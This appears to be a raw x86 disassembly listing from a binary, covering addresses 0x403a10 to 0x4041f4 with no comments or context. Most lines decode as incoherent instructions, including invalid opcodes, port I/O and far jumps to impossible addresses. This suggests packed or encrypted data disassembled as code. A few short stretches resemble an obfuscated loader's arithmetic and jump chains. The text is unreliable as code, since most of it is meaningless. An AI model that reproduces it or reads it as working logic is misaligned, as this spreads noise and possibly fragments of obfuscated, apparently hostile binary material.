  403a10:	fmul   DWORD PTR [ebp+0x1fe673d6]
  403a16:	ficom  WORD PTR es:[ebp+0x58af9906]
  403a1d:	cmp    BYTE PTR [ebx+0x5f],bh
  403a20:	mov    DWORD PTR [eax],ebp
  403a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a23:	push   0x501e42af
  403a28:	jp     0x4039f0
  403a2a:	or     esi,edi
  403a2c:	in     al,dx
  403a2d:	xor    eax,0x173dafe2
  403a32:	pop    es
  403a33:	sbb    eax,0x9b8641d9
  403a38:	push   esp
  403a39:	in     eax,0xde
  403a3b:	jno    0x403a03
  403a3d:	and    DWORD PTR [ebp+0x643bb5f3],ecx
  403a43:	mov    ebx,0x674e8e8a
  403a48:	or     al,cl
  403a4a:	inc    ebx
  403a4b:	stos   DWORD PTR es:[edi],eax
  403a4c:	xor    ch,dh
  403a4e:	jmp    0xc8fdbf31
  403a53:	inc    eax
  403a54:	ret    
  403a55:	ret    
  403a56:	nop
  403a57:	addr16 mov ch,0x3e
  403a5a:	fidiv  WORD PTR [edi-0x2b062ef8]
  403a60:	nop
  403a61:	call   0x7a445c46
  403a66:	js     0x403a15
  403a68:	ds pop esp
  403a6a:	adc    al,0x6f
  403a6c:	fnsave [eax-0x7c01cfc9]
  403a72:	clc    
  403a73:	mov    edx,0x5d83b3be
  403a78:	aad    0x5d
  403a7a:	jne    0x403a4f
  403a7c:	outs   dx,DWORD PTR ds:[esi]
  403a7d:	sub    DWORD PTR [ebp-0x54c54bc2],ebx
  403a83:	sbb    al,0x3b
  403a85:	int3   
  403a86:	imul   DWORD PTR [ebx+esi*4-0x3]
  403a8a:	popa   
  403a8b:	lods   al,BYTE PTR ds:[esi]
  403a8c:	aas    
  403a8d:	dec    esp
  403a8e:	repz cmp dl,BYTE PTR [ecx-0x4097e4f6]
  403a95:	in     eax,0xd9
  403a97:	mov    dl,ch
  403a99:	inc    edx
  403a9a:	popa   
  403a9b:	mov    dh,0x47
  403a9d:	cwde   
  403a9e:	xor    al,0x71
  403aa0:	jnp    0x403a87
  403aa2:	push   edi
  403aa3:	or     BYTE PTR [edi+0x5ad5f96f],bh
  403aa9:	lahf   
  403aaa:	mov    eax,0x44caccbb
  403aaf:	inc    ecx
  403ab0:	mov    eax,0x1a27556e
  403ab5:	sahf   
  403ab6:	jmp    0x403a4b
  403ab8:	in     eax,dx
  403ab9:	imul   eax,DWORD PTR [edi-0x7f],0x3d
  403abd:	addr16 dec ebp
  403abf:	xor    eax,0x8183eca1
  403ac4:	into   
  403ac5:	mov    BYTE PTR [eax-0x62b972e2],ah
  403acb:	test   eax,0xf82d656e
  403ad0:	mov    BYTE PTR [eax-0x71bbf7b3],dh
  403ad6:	jmp    0x672f582b
  403adb:	sbb    edx,ebx
  403add:	jae    0x403ab9
  403adf:	fucomi st,st(5)
  403ae1:	clc    
  403ae2:	jns    0x403b50
  403ae4:	lds    esi,FWORD PTR [edx-0x74]
  403ae7:	dec    edi
  403ae8:	in     al,0x80
  403aea:	imul   ebp,DWORD PTR [esi+0x57c4ee42],0xfff458a
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x66e69597],esi
  403b3e:	loopne 0x403b05
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xd970707d
  403b48:	mov    al,ds:0x4065a925
  403b4d:	(bad)  
  403b4e:	jecxz  0x403b70
  403b50:	das    
  403b51:	adc    esi,esi
  403b53:	out    dx,al
  403b54:	push   esi
  403b55:	dec    edi
  403b56:	fmul   st,st(2)
  403b58:	and    DWORD PTR [eax+0x7daeaa41],0x191607fa
  403b62:	jmp    0xfba193d3
  403b67:	inc    esp
  403b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b69:	ja     0x403afa
  403b6b:	xor    dl,dh
  403b6d:	daa    
  403b6e:	data16 sti 
  403b70:	dec    esi
  403b71:	not    ecx
  403b73:	xchg   dl,dh
  403b75:	mov    dl,0xec
  403b77:	aam    0xc1
  403b79:	hlt    
  403b7a:	mov    eax,0x27d65fd2
  403b7f:	outs   dx,DWORD PTR ds:[esi]
  403b80:	fild   WORD PTR [edi-0x30]
  403b83:	xor    al,0x30
  403b85:	pop    ss
  403b86:	xchg   esp,eax
  403b87:	jo     0x403bf3
  403b89:	mov    bl,0xa6
  403b8b:	xor    cl,BYTE PTR [esi+eax*1-0x12936517]
  403b92:	pop    edx
  403b93:	jne    0x403bcf
  403b95:	call   0xbef38c28
  403b9a:	mov    bl,BYTE PTR [edx+ebp*1-0x5b]
  403b9e:	sbb    al,0xa8
  403ba0:	stc    
  403ba1:	dec    edx
  403ba2:	test   eax,0xa592122e
  403ba7:	cmp    al,BYTE PTR [edi]
  403ba9:	int3   
  403baa:	mov    dh,0x99
  403bac:	clc    
  403bad:	push   ebx
  403baf:	xchg   edx,eax
  403bb0:	mov    dl,0xae
  403bb2:	outs   dx,BYTE PTR ds:[esi]
  403bb3:	dec    eax
  403bb4:	adc    ch,BYTE PTR [ebx+edx*2+0x22604394]
  403bbb:	lock jo 0x403c1c
  403bbe:	ins    BYTE PTR es:[edi],dx
  403bbf:	xchg   ebx,eax
  403bc0:	jo     0x403be3
  403bc2:	xchg   esp,eax
  403bc3:	sub    al,bh
  403bc5:	shr    BYTE PTR [edi+0x6],cl
  403bc8:	inc    eax
  403bc9:	mov    esi,0x69a19d3c
  403bce:	mov    ah,ch
  403bd0:	pusha  
  403bd1:	jns    0x403bc8
  403bd3:	add    BYTE PTR [ebx],ch
  403bd5:	dec    edi
  403bd6:	xchg   ecx,eax
  403bd7:	test   BYTE PTR [edi],ah
  403bd9:	push   ecx
  403bda:	jge    0x403bae
  403bdc:	ror    DWORD PTR [ebx+0x7fb4d584],cl
  403be2:	popa   
  403be3:	xor    al,0x22
  403be5:	mov    ds:0xbc1e07d2,al
  403bea:	pop    esi
  403beb:	push   esp
  403bec:	outs   dx,BYTE PTR ds:[esi]
  403bed:	dec    esi
  403bee:	lea    esp,[ecx+0x74dd2028]
  403bf4:	jl     0x403bc7
  403bf6:	in     al,0xa4
  403bf8:	sbb    al,0x77
  403bfa:	push   0x916365bc
  403bff:	std    
  403c00:	loop   0x403bd0
  403c02:	jmp    0x69c7cd18
  403c07:	adc    eax,0x1ff19e78
  403c0c:	aaa    
  403c0d:	mov    ds:0x3bb5b2c8,al
  403c12:	xchg   esp,esi
  403c14:	enter  0xc99f,0x8a
  403c18:	outs   dx,DWORD PTR ds:[esi]
  403c19:	test   BYTE PTR [edi+eiz*8],bh
  403c1c:	mov    edi,0x4b14838e
  403c21:	ins    BYTE PTR es:[edi],dx
  403c22:	xchg   ebp,eax
  403c23:	repnz mov cl,0x25
  403c26:	adc    al,0x51
  403c28:	jge    0x403ca0
  403c2a:	enter  0x3029,0x32
  403c2e:	xor    DWORD PTR [edi+esi*2],ebp
  403c31:	pop    edi
  403c32:	adc    DWORD PTR [esi+esi*4-0x3a],esp
  403c36:	adc    al,0x9a
  403c38:	xchg   esp,eax
  403c39:	xor    DWORD PTR [eax+0x47d422ae],eax
  403c3f:	sar    DWORD PTR [esi+edx*8+0x27aef5f5],1
  403c46:	xchg   ebp,eax
  403c47:	or     BYTE PTR [edx],0xbd
  403c4a:	xchg   ebp,eax
  403c4b:	test   DWORD PTR cs:[esi-0x683c0532],ebx
  403c52:	mov    BYTE PTR [eax],dl
  403c54:	hlt    
  403c55:	jns    0x403c2a
  403c57:	ins    DWORD PTR es:[edi],dx
  403c58:	push   eax
  403c59:	das    
  403c5a:	inc    esp
  403c5b:	ret    
  403c5c:	lods   al,BYTE PTR ds:[esi]
  403c5d:	popf   
  403c5e:	call   0x22580907
  403c63:	jae    0x403cb1
  403c65:	sub    esp,DWORD PTR [ebx+ecx*4]
  403c68:	xlat   BYTE PTR ds:[ebx]
  403c69:	xchg   DWORD PTR [ecx+0x284cb58a],ebp
  403c6f:	adc    ah,BYTE PTR [ecx]
  403c71:	add    ebp,ecx
  403c73:	ins    DWORD PTR es:[edi],dx
  403c74:	call   0xde97aa11
  403c79:	gs cmp al,0x79
  403c7c:	je     0x403c8e
  403c7e:	repnz ficomp WORD PTR [ecx]
  403c81:	jecxz  0x403cdd
  403c83:	pop    ss
  403c84:	sar    DWORD PTR [edi-0x748330ae],0x79
  403c8b:	jg     0x403c9c
  403c8d:	fdivr  DWORD PTR [ebp-0x1d]
  403c90:	rcl    bl,1
  403c92:	jl     0x403c4f
  403c94:	imul   esi,esi,0xfffffffc
  403c97:	mov    WORD PTR [edx],cs
  403c99:	jo     0x403cd8
  403c9b:	fisubr WORD PTR [ebx+0x6f]
  403c9e:	cdq    
  403c9f:	adc    cl,0xa0
  403ca2:	shl    BYTE PTR [ecx-0x30b585b0],cl
  403ca8:	fild   DWORD PTR [ecx+esi*4]
  403cab:	inc    eax
  403cac:	aam    0xde
  403cae:	inc    esi
  403caf:	aad    0x2e
  403cb1:	and    BYTE PTR ds:0x665e145f,bh
  403cb7:	xor    eax,0x9f0bbb3f
  403cbc:	int    0xab
  403cbe:	das    
  403cbf:	mov    cl,0xaf
  403cc1:	ins    DWORD PTR es:[edi],dx
  403cc2:	or     eax,DWORD PTR [edi]
  403cc4:	outs   dx,BYTE PTR ds:[esi]
  403cc5:	xchg   edx,eax
  403cc6:	(bad)  
  403cc7:	imul   ebx,edi,0xffffffaa
  403cca:	mov    ds:0x96f9636b,eax
  403ccf:	dec    edi
  403cd0:	adc    BYTE PTR [edi-0x538cbad0],ch
  403cd6:	repz xchg esp,eax
  403cd8:	pop    ebx
  403cd9:	add    BYTE PTR [edi+edx*1-0x61],dl
  403cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cde:	inc    edi
  403cdf:	sub    esp,DWORD PTR [eax]
  403ce1:	lods   eax,DWORD PTR ds:[esi]
  403ce2:	jg     0x403d2f
  403ce4:	xor    BYTE PTR [eax+eiz*4-0x52],cl
  403ce8:	pushf  
  403ce9:	jle    0x403c86
  403ceb:	mov    WORD PTR [ebx+esi*8+0x684bee91],ds
  403cf2:	sbb    DWORD PTR [esi],esp
  403cf4:	(bad)  
  403cf5:	sub    al,0xba
  403cf7:	add    DWORD PTR [esi+0x3c],ebp
  403cfa:	mov    dl,0x6f
  403cfc:	xchg   edi,eax
  403cfd:	jmp    0x6a42f6f7
  403d02:	ins    DWORD PTR es:[edi],dx
  403d03:	mov    cl,0xf5
  403d05:	dec    esp
  403d06:	jp     0x403d6c
  403d08:	jmp    0x4fd:0xe801930b
  403d0f:	sbb    eax,esi
  403d11:	xor    eax,0x4a09ed2f
  403d16:	ret    
  403d17:	xchg   DWORD PTR [edx],eax
  403d19:	xchg   ebx,eax
  403d1a:	cmp    dl,BYTE PTR [ebp-0x55]
  403d1d:	or     BYTE PTR [edx+0x14],bh
  403d20:	sbb    DWORD PTR [ecx-0x3f],ebx
  403d23:	or     DWORD PTR [esi-0x43],ecx
  403d26:	push   ecx
  403d27:	inc    esp
  403d28:	sbb    BYTE PTR [edx],0x0
  403d2b:	inc    ebp
  403d2c:	mov    ebx,0x64cf921e
  403d31:	jmp    0x403cfd
  403d33:	repz mov WORD PTR [ebp-0xf],cs
  403d37:	xor    al,0x57
  403d39:	adc    DWORD PTR [edx-0x7d],0x5d4a8221
  403d40:	xchg   ecx,eax
  403d41:	je     0x403d6b
  403d43:	rcr    BYTE PTR [edx+ecx*2-0x8ca4961],1
  403d4a:	sub    al,0xe8
  403d4c:	inc    ecx
  403d4d:	adc    edi,DWORD PTR [esi-0x6102466c]
  403d53:	pop    ebp
  403d54:	add    dh,BYTE PTR [edx]
  403d56:	mov    edx,0x94bd8b0c
  403d5b:	das    
  403d5c:	mov    dh,0xe7
  403d5e:	stc    
  403d5f:	xchg   edx,eax
  403d60:	cdq    
  403d61:	jle    0x403dcb
  403d63:	sub    BYTE PTR [ebx],bl
  403d65:	rcr    al,1
  403d67:	or     eax,0x842ef272
  403d6c:	adc    esi,DWORD PTR [edx]
  403d6e:	jae    0x403d11
  403d70:	mov    bl,BYTE PTR [ebx-0x3f]
  403d73:	mov    al,ds:0x203f9d96
  403d78:	add    eax,0x47e3d740
  403d7d:	cmc    
  403d7e:	lods   eax,DWORD PTR ds:[esi]
  403d7f:	cmp    edx,DWORD PTR ds:0x77b645a6
  403d85:	pop    DWORD PTR [esi-0xa]
  403d88:	dec    edi
  403d89:	add    bl,BYTE PTR [esi]
  403d8b:	shl    BYTE PTR [ebx],cl
  403d8d:	pop    esi
  403d8e:	xchg   BYTE PTR [ecx],ch
  403d90:	jp     0x403d23
  403d92:	and    DWORD PTR [edi],ecx
  403d94:	cdq    
  403d95:	cmp    cl,BYTE PTR [edi-0x1b]
  403d98:	imul   ecx,DWORD PTR [eax+eax*1+0x35],0x7b397f67
  403da0:	jbe    0x403df0
  403da2:	or     DWORD PTR [ebx-0x76],esp
  403da5:	ins    DWORD PTR es:[edi],dx
  403da6:	mov    esi,0xa9fbcd19
  403dab:	add    ebp,esp
  403dad:	push   edx
  403dae:	sbb    BYTE PTR [edi+edi*4+0x4dead8c3],0xed
  403db6:	jns    0x403d4f
  403db8:	stos   BYTE PTR es:[edi],al
  403db9:	ins    BYTE PTR es:[edi],dx
  403dba:	mov    BYTE PTR [edi],0x9a
  403dbd:	lahf   
  403dbe:	cmp    bh,bl
  403dc0:	and    DWORD PTR ds:0x77d576fd,0xffffff99
  403dc7:	cmp    esi,DWORD PTR [esi-0xc]
  403dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dcb:	mov    al,ds:0xc335286b
  403dd0:	add    bl,ch
  403dd2:	stos   BYTE PTR es:[edi],al
  403dd3:	or     al,0x74
  403dd5:	mov    ds:0xb490db32,eax
  403dda:	jae    0x403df9
  403ddc:	inc    eax
  403ddd:	xchg   edx,eax
  403dde:	inc    ecx
  403ddf:	dec    eax
  403de0:	pop    es
  403de1:	ss in  al,dx
  403de3:	jmp    0x6446:0x3c02c43b
  403dea:	mov    ds:0xd9234ae6,eax
  403def:	test   eax,0x3899b62d
  403df4:	mov    edi,0xe55c464f
  403df9:	ss jns 0x403da8
  403dfc:	mov    dh,0x7c
  403dfe:	out    dx,al
  403dff:	ret    0xd9b8
  403e02:	data16 outs dx,BYTE PTR ds:[esi]
  403e04:	not    DWORD PTR [eax+ecx*8]
  403e07:	inc    eax
  403e08:	ret    0xf6d3
  403e0b:	das    
  403e0c:	les    edi,FWORD PTR [ebx+0x286e5b5f]
  403e12:	cmp    ebp,edx
  403e14:	jns    0x403dcf
  403e16:	inc    ebp
  403e17:	mov    eax,ds:0xeea68dbf
  403e1c:	jle    0x403dd4
  403e1e:	scas   eax,DWORD PTR es:[edi]
  403e1f:	div    DWORD PTR [esi+edx*2-0x1c17a20b]
  403e26:	mov    bl,0xbc
  403e28:	call   0x78839104
  403e2d:	jmp    0x1725:0x1606b3d5
  403e34:	add    eax,0xcb3f7749
  403e39:	xor    BYTE PTR [eax],al
  403e3b:	jp     0x403df8
  403e3d:	cmp    BYTE PTR [ebp-0x3f],bl
  403e40:	mov    bh,dh
  403e42:	sar    DWORD PTR [eax-0xfb77598],cl
  403e48:	jo     0x403e71
  403e4a:	idiv   DWORD PTR [esi+ebp*4+0x16]
  403e4e:	sub    BYTE PTR [edx+0x1e],0x71
  403e52:	retf   
  403e53:	xor    edx,ebx
  403e55:	shl    BYTE PTR [eax-0x1d5d86f1],0x56
  403e5c:	call   0xd4045fb6
  403e61:	cdq    
  403e62:	lock xor al,0x16
  403e65:	bnd jmp 0xc9bc8e1
  403e6b:	pushf  
  403e6c:	xor    BYTE PTR [ebx],bh
  403e6e:	icebp  
  403e6f:	out    0xbf,al
  403e71:	bswap  ebp
  403e73:	dec    dl
  403e75:	retf   
  403e76:	ja     0x403ef3
  403e78:	jmp    0xe3eb95d4
  403e7d:	jp     0x403ea4
  403e7f:	jge    0x403ec5
  403e81:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  403e83:	push   ecx
  403e84:	inc    ebx
  403e85:	xor    ecx,DWORD PTR [edi]
  403e87:	je     0x403eca
  403e89:	call   0x9c85:0x30f045c7
  403e90:	clc    
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x68b61c35
  403eec:	jecxz  0x403f4c
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403ea1
  403ef7:	push   ecx
  403ef8:	addr16 dec ebp
  403efa:	stc    
  403efb:	mov    DWORD PTR [ecx-0x609b8403],0xf44fceac
  403f05:	xchg   ebx,eax
  403f06:	lahf   
  403f07:	aaa    
  403f08:	outs   dx,BYTE PTR ds:[esi]
  403f09:	push   ebx
  403f0a:	mov    es,WORD PTR [ebx-0x757423f7]
  403f10:	sar    DWORD PTR [edi-0x17a707b2],0xbb
  403f17:	jg     0x403f85
  403f19:	rol    DWORD PTR [ecx+0x20],cl
  403f1c:	add    al,0x30
  403f1e:	(bad)  
  403f1f:	mov    WORD PTR [eax],ss
  403f21:	aam    0xa6
  403f23:	sub    DWORD PTR [edi-0x6601f50b],ecx
  403f29:	add    ebp,DWORD PTR [ebp-0x72858f6]
  403f2f:	fsub   DWORD PTR [edi+ebp*4]
  403f32:	hlt    
  403f33:	(bad)  
  403f34:	mov    ds:0xbc355ab7,al
  403f39:	sbb    al,0x9c
  403f3b:	dec    esi
  403f3c:	push   ebx
  403f3d:	mov    dh,BYTE PTR [esi-0x38]
  403f40:	enter  0x7d25,0xab
  403f44:	mov    BYTE PTR [ebx],bh
  403f46:	jg     0x403f01
  403f48:	adc    BYTE PTR [ecx],0x12
  403f4b:	imul   cl
  403f4d:	mov    ebx,0x2c048a9a
  403f52:	adc    edx,eax
  403f54:	pop    ss
  403f55:	push   edx
  403f56:	mov    ds:0x40e5c067,al
  403f5b:	fwait
  403f5c:	adc    al,0x53
  403f5e:	call   0xf3f9:0xfad422fe
  403f65:	mov    esi,0x1bc8e3da
  403f6a:	cmovle esi,DWORD PTR [eax]
  403f6d:	ret    0xfd70
  403f70:	jp     0x403f87
  403f72:	sbb    DWORD PTR ds:0x4e6abcf7,edx
  403f78:	xor    eax,0xcb601268
  403f7d:	pop    es
  403f7e:	clc    
  403f7f:	(bad)  
  403f80:	sub    al,0x24
  403f82:	xchg   esp,eax
  403f83:	mov    al,0xd
  403f85:	retf   0x684
  403f88:	das    
  403f89:	out    dx,al
  403f8a:	cmc    
  403f8b:	push   ebx
  403f8c:	and    eax,0x8d54cc88
  403f91:	xor    bh,BYTE PTR [ebx-0x56]
  403f94:	call   0xac73:0x7cc89ae3
  403f9b:	dec    BYTE PTR [edi-0x43]
  403f9e:	in     al,dx
  403f9f:	pop    ecx
  403fa0:	repz inc ebp
  403fa2:	dec    edx
  403fa3:	inc    edi
  403fa4:	jp     0x403f6a
  403fa6:	aaa    
  403fa7:	push   esi
  403fa8:	cld    
  403fa9:	js     0x403fa7
  403fab:	push   es
  403fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fad:	retf   0x58e3
  403fb0:	mov    edi,0x7507e8b8
  403fb5:	out    0x21,eax
  403fb7:	test   BYTE PTR [esi+0x37],0xee
  403fbb:	outs   dx,DWORD PTR ds:[esi]
  403fbc:	inc    esp
  403fbd:	push   0xfffffff0
  403fbf:	inc    esi
  403fc0:	aam    0x4d
  403fc2:	xchg   edx,eax
  403fc3:	cli    
  403fc4:	dec    ebp
  403fc5:	mov    cl,0x4a
  403fc7:	mov    cl,BYTE PTR [edx-0x6f552854]
  403fcd:	loopne 0x403fef
  403fcf:	push   edx
  403fd0:	mov    edx,gs
  403fd2:	pop    ebx
  403fd3:	xchg   ebx,eax
  403fd4:	mov    ch,0xa1
  403fd6:	jns    0x404035
  403fd8:	sub    DWORD PTR [edx-0x45],edi
  403fdb:	ds int 0xfc
  403fde:	repz retf 0x92e6
  403fe2:	cmp    dh,BYTE PTR [edx-0x4d]
  403fe5:	push   0xffffffdd
  403fe7:	ror    DWORD PTR [edx-0x755448fa],1
  403fed:	jge    0x403fa6
  403fef:	pop    es
  403ff0:	shl    DWORD PTR [edi-0x5],0x9e
  403ff4:	cmp    BYTE PTR [eax-0x41],0x5a
  403ff8:	clc    
  403ff9:	sbb    al,0xb5
  403ffb:	pop    eax
  403ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ffd:	push   edi
  403ffe:	cmp    eax,0x8da35cdd
  404003:	shr    ah,cl
  404005:	dec    eax
  404006:	test   al,0xbf
  404008:	or     DWORD PTR [edi],ebx
  40400a:	lea    ebp,[eax+ebp*2]
  40400d:	sub    eax,0xdf343d18
  404012:	xchg   ebp,eax
  404013:	lahf   
  404014:	jge    0x404039
  404016:	dec    esp
  404017:	and    BYTE PTR [ebx+ebx*4+0x6a],ch
  40401b:	inc    eax
  40401c:	dec    ecx
  40401d:	popa   
  40401e:	vrcpss xmm4,xmm3,DWORD PTR [eax+0xdca1ba5]
  404026:	dec    ecx
  404027:	cmp    DWORD PTR [edi],ebx
  404029:	stos   BYTE PTR es:[edi],al
  40402a:	hlt    
  40402b:	mov    al,ds:0x91399b7
  404030:	and    al,0x20
  404032:	pop    ds
  404033:	xor    BYTE PTR [ebp-0x59e1668d],al
  404039:	jmp    FWORD PTR [esi+0x533d4ca]
  40403f:	ins    DWORD PTR es:[edi],dx
  404040:	sahf   
  404041:	mov    bl,BYTE PTR [eax-0x68]
  404044:	stc    
  404045:	mov    dh,0xbc
  404047:	cmp    DWORD PTR [eax-0x58],ebp
  40404a:	and    eax,0xfe244aef
  40404f:	pusha  
  404050:	clc    
  404051:	mov    ah,0xa9
  404053:	jmp    0xa2a4:0xc0a87487
  40405a:	adc    eax,0x1d43ef04
  40405f:	fucomi st,st(6)
  404061:	fnsave [edi-0x2c]
  404064:	enter  0x299e,0xa1
  404068:	xchg   ecx,eax
  404069:	ins    DWORD PTR es:[edi],dx
  40406a:	movzx  ebx,bp
  40406d:	int3   
  40406e:	fidivr DWORD PTR [ebp-0xa]
  404071:	pop    ss
  404072:	scas   eax,DWORD PTR es:[edi]
  404073:	xchg   esp,eax
  404074:	mov    cl,ch
  404076:	xor    eax,DWORD PTR [ecx+0x3a4a2b3c]
  40407c:	pop    esi
  40407d:	out    dx,al
  40407e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40407f:	jne    0x404087
  404081:	call   0xf0d0c734
  404086:	clc    
  404087:	push   0x2e
  404089:	jb     0x4040bb
  40408b:	pop    eax
  40408c:	out    0x7c,eax
  40408e:	pop    ecx
  40408f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404090:	pusha  
  404091:	push   ds
  404092:	lods   eax,DWORD PTR ds:[esi]
  404093:	dec    ecx
  404094:	gs pop edi
  404096:	rcl    BYTE PTR [edx-0x5987b043],cl
  40409c:	cmp    bl,ah
  40409e:	(bad)  
  40409f:	mul    al
  4040a1:	fisttp DWORD PTR [eax]
  4040a3:	test   BYTE PTR [ebx-0x7a],dl
  4040a6:	mov    eax,0x2abb6874
  4040ab:	xor    BYTE PTR [edi],0x70
  4040ae:	mov    ch,0xc1
  4040b0:	sub    ah,BYTE PTR [edi+0x54]
  4040b3:	stos   DWORD PTR es:[edi],eax
  4040b4:	leave  
  4040b5:	jnp    0x4040be
  4040b7:	sub    esi,DWORD PTR [esi-0x115fbe75]
  4040bd:	je     0x404062
  4040bf:	xchg   ecx,eax
  4040c0:	jno    0x40406c
  4040c2:	or     eax,DWORD PTR [ebx+eiz*2+0x622b5c7e]
  4040c9:	ret    
  4040ca:	dec    esp
  4040cb:	adc    edx,esi
  4040cd:	mov    ah,0x5b
  4040cf:	call   0x9b6c:0x158440ff
  4040d6:	rol    BYTE PTR [eax-0x7224fb25],1
  4040dc:	test   BYTE PTR [esi+0x78c34eaf],bh
  4040e2:	xor    ebp,esi
  4040e4:	ja     0x404118
  4040e6:	xchg   edi,eax
  4040e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040e8:	iret   
  4040e9:	aas    
  4040ea:	xchg   ebx,eax
  4040eb:	mov    al,0x93
  4040ed:	mov    eax,ds:0x501bb595
  4040f2:	push   edi
  4040f3:	pop    ebp
  4040f4:	add    DWORD PTR [eax-0x22],ebx
  4040f7:	lods   al,BYTE PTR ds:[esi]
  4040f8:	repz xchg esp,eax
  4040fa:	inc    edi
  4040fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040fc:	inc    ecx
  4040fd:	push   ds
  4040fe:	int    0x8a
  404100:	xor    eax,0xd468e072
  404105:	mov    edi,0xa5154e3e
  40410a:	cmp    BYTE PTR [ecx+0x2b],bl
  40410d:	fimul  WORD PTR [ebx+0x64]
  404110:	or     DWORD PTR [ebp-0x2e],eax
  404113:	lea    ebp,[eax]
  404115:	data16 sbb al,0x1
  404118:	xor    eax,0x8e88359c
  40411d:	mov    bl,0xd3
  40411f:	(bad)  
  404120:	or     al,0x0
  404122:	fadd   DWORD PTR [eax]
  404124:	in     eax,dx
  404125:	aaa    
  404126:	add    al,BYTE PTR [esi]
  404128:	push   edi
  404129:	adc    esp,DWORD PTR [esp+ebp*1]
  40412c:	int3   
  40412d:	call   0xb41c0389
  404132:	pop    esi
  404133:	lea    ecx,[ecx-0x5e79575f]
  404139:	sbb    ch,BYTE PTR [edx+0xc]
  40413c:	jecxz  0x40414a
  40413e:	mov    bl,0x48
  404140:	mov    al,0x66
  404142:	mov    esi,0xdc36006
  404147:	xor    esp,DWORD PTR [edi+0x3a]
  40414a:	xlat   BYTE PTR ds:[ebx]
  40414b:	xchg   ebp,eax
  40414c:	aas    
  40414d:	test   al,0xa6
  40414f:	fdivr  st(5),st
  404151:	jg     0x40415d
  404153:	fcomp  QWORD PTR [ecx]
  404155:	adc    eax,0x84d47b2f
  40415a:	or     DWORD PTR [edx+0x18],ebx
  40415d:	les    esp,FWORD PTR [ecx-0x48d9cb6b]
  404163:	fwait
  404164:	mov    ds:0xbf618680,eax
  404169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40416a:	inc    esi
  40416b:	test   BYTE PTR [eax],bh
  40416d:	jp     0x404185
  40416f:	jl     0x4041ed
  404171:	pop    eax
  404172:	fwait
  404173:	pop    esp
  404174:	dec    ebx
  404175:	into   
  404176:	sbb    eax,0x605ee862
  40417b:	retf   
  40417c:	sub    eax,0x48b4a645
  404181:	push   ebp
  404182:	xor    edi,edx
  404184:	imul   BYTE PTR [eax+0x727ae1ff]
  40418a:	add    eax,0x52233132
  40418f:	nop
  404190:	into   
  404191:	xor    eax,0x24f98e0b
  404196:	push   ebx
  404197:	sbb    BYTE PTR [edi-0x3a37b016],ah
  40419d:	inc    esp
  40419e:	ds out 0xa,eax
  4041a1:	repnz adc ebp,ebp
  4041a4:	dec    esp
  4041a5:	cmp    eax,edi
  4041a7:	jmp    0x9295c874
  4041ac:	pop    ds
  4041ad:	xor    eax,0x27da19c0
  4041b2:	popa   
  4041b3:	sub    ebp,ebx
  4041b5:	inc    esp
  4041b6:	inc    ecx
  4041b7:	lods   eax,DWORD PTR ds:[esi]
  4041b8:	mul    DWORD PTR [esi+0x6b]
  4041bb:	addr16 mov ds:0xd402,eax
  4041bf:	pop    esi
  4041c0:	sub    DWORD PTR [eax],0xffffffb6
  4041c3:	imul   esp,eax,0xffffffaa
  4041c6:	xor    eax,0xd2b79158
  4041cb:	cdq    
  4041cc:	or     DWORD PTR [ebp+0x1cf3f7ef],esi
  4041d2:	dec    esi
  4041d3:	inc    ebx
  4041d4:	jne    0x40421c
  4041d6:	sar    dl,1
  4041d8:	push   esi
  4041d9:	cmp    BYTE PTR [ebx],cl
  4041db:	cwde   
  4041dc:	stos   DWORD PTR es:[edi],eax
  4041dd:	mov    esi,0x9b9e27f0
  4041e2:	lds    eax,FWORD PTR [esi+0x12]
  4041e5:	jnp    0x404182
  4041e7:	mov    ds:0x2266d7db,al
  4041ec:	inc    edx
  4041ed:	std    
  4041ee:	fimul  DWORD PTR [ebx+esi*4-0x28]
  4041f2:	or     ch,bh
  4041f4:	fidiv  WORD PTR [ecx+0x62]
